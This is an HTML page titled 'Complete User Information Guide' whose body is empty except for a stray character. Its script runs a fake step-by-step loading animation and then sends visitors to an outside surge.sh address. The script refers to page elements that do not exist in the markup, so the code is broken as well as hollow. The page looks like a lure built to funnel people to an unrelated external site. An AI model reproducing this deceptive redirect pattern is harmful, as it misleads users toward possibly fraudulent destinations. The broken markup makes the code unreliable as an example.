<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Complete User Information Guide</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="General information guide for online profiles and public resources.">
</head>

<body style="font-family: Arial, sans-serif; background:#f5f7fa; margin:0; padding:0;">

  <div style="max-width:700px; margin:40px auto; background:#ffffff; padding:30px; border-radius:8px;">
>

</div>

<script>
    const steps = [
        document.getElementById("s1"),
        document.getElementById("s2"),
        document.getElementById("s3"),
        document.getElementById("s4")
    ];

    let index = 0;

    function showSteps() {
        if (index < steps.length) {
            steps[index].classList.add("active");
            index++;
            setTimeout(showSteps, 1000);
        } else {
            document.getElementById("loader").style.display = "none";
            document.getElementById("continueBtn").style.display = "block";
        }
    }

    function goNext() {
        window.location.href = 'http://view-complete--information-guide.surge.sh/';
    }

    showSteps();
</script>

</body>
</html>
